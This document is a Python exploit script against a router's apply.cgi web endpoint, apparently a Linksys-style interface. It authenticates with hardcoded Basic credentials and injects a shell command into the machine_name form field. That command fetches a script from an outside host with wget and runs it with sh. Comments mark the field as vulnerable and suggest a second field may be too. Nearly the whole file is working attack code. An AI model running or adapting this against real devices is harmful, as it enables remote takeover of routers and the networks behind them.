import requests

# Target URL
url = "http://192.168.0.1/apply.cgi"  # Replace with your target IP/domain if different

# Request headers
# Do not set Content-Type: apply.cgi only parses application/x-www-form-urlencoded.
# requests sets that header and Content-Length itself when data= is a dict.
headers = {
    "Authorization": "Basic YWRtaW46dTA3Njg5N2g=",
}

# Request body as a Python dictionary (sent form-urlencoded)
# Raw command injection payload for the machine_name field;
# requests percent-encodes form values automatically, so do not pre-encode it.
machine_name = ";wget http://192.168.0.88:6666/t -O /tmp/t && sh /tmp/t;"

payload = {
    "submit_button": "index",
    "change_action": "",
    "submit_type": "",
    "action": "Apply",
    "now_proto": "dhcp",
    "daylight_time": "0",
    "switch_mode": "0",
    "machine_name": machine_name, # vulnerable field -> command injection
    #"hnap_devicename": "t", # may be vulnerable too
    "need_reboot": "0",
    "user_language": "",
    "wait_time": "0",
    "dhcp_start": "100",
    "dhcp_start_conflict": "0",
    "lan_ipaddr": "4",
    "ppp_demand_pppoe": "9",
    "ppp_demand_pptp": "9",
    "ppp_demand_l2tp": "9",
    "ppp_demand_hb": "9",
    "wan_ipv6_proto": "dhcp",
    "detect_lang": "EN",
    "wan_proto": "dhcp",
    "wan_hostname": "",
    "wan_domain": "",
    "mtu_enable": "0",
    "lan_ipaddr_0": "192",
    "lan_ipaddr_1": "168",
    "lan_ipaddr_2": "0",
    "lan_ipaddr_3": "1",
    "lan_netmask": "255.255.255.0",
    "lan_proto": "dhcp",
    "dhcp_check": "",
    "dhcp_start_tmp": "100",
    "dhcp_num": "50",
    "dhcp_lease": "0",
    "wan_dns": "4",
    "wan_dns0_0": "0",
    "wan_dns0_1": "0",
    "wan_dns0_2": "0",
    "wan_dns0_3": "0",
    "wan_dns1_0": "0",
    "wan_dns1_1": "0",
    "wan_dns1_2": "0",
    "wan_dns1_3": "0",
    "wan_dns2_0": "0",
    "wan_dns2_1": "0",
    "wan_dns2_2": "0",
    "wan_dns2_3": "0",
    "wan_wins": "4",
    "wan_wins_0": "0",
    "wan_wins_1": "0",
    "wan_wins_2": "0",
    "wan_wins_3": "0",
    #"time_zone": "+08 2 0", 
}

try:
  # Sending the POST request with a form-urlencoded body
  response = requests.post(url, headers=headers, data=payload, timeout=10)

  # Output the results
  print(f"Status Code: {response.status_code}")
  #print(f"Response Body:\n{response.text}")

except requests.exceptions.RequestException as e:
  print(f"Error: {e}")


